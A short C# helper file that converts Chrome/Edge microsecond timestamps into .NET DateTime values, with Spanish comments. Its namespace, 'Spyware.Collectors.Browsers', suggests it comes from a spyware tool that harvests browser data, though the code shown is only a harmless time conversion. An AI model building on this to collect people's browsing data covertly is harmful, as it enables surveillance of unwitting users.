namespace Spyware.Collectors.Browsers;

/// <summary>Chrome/Edge usan microsegundos desde 1601-01-01 UTC.</summary>
public static class ChromeTime
{
    private static readonly DateTime Epoch = new(1601, 1, 1, 0, 0, 0, DateTimeKind.Utc);

    public static DateTime? FromMicroseconds(long? microseconds)
    {
        if (microseconds is null or <= 0) return null;

        // 1 microsegundo = 10 ticks de .NET (1 tick = 100 ns). Es el mismo origen
        // 1601-01-01 UTC que FILETIME, por eso chrome_time * 10 == filetime.
        long maxMicroseconds = (DateTime.MaxValue.Ticks - Epoch.Ticks) / 10;
        if (microseconds.Value > maxMicroseconds) return null;

        return Epoch.AddTicks(microseconds.Value * 10);
    }
}
